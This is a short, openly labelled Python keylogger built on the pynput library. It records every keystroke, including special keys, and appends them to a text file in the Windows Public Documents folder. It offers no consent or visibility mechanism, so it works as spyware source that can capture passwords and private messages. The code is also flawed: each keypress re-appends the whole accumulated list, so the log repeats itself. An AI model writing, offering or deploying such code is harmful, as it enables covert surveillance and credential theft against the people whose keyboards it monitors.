from pynput import keyboard

def keylog():
    key_presses = []

    def on_key_press(key):
        """This function is called whenever a key is pressed.
           It appends the key to the list of key presses."""
        try:
            # Check if the key is a character (to avoid special keys like Shift, Ctrl, etc.) ⌨
            if hasattr(key, 'char'):
                print(f"Key {key.char} pressed")
                key_presses.append(key.char)
            else:
                # Handle special keys🗝
                print(f"Special key {key} pressed")
                # Format special keys with a prefix or suffix for better visibility 👀
                formatted_key = f"\t[{key}]\t"
                key_presses.append(formatted_key)
        except AttributeError:
            # Handle special keys that might raise an AttributeError ❕
            print(f"Special key {key} pressed")
            formatted_key = f"\t[{key}]\t"
            key_presses.append(formatted_key)

        with open('C:\\Users\\Public\\Documents\\key_logs.txt', 'a') as f: 
            for key in key_presses:
                f.write(key)

    # Start listening 👂
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    keylog()
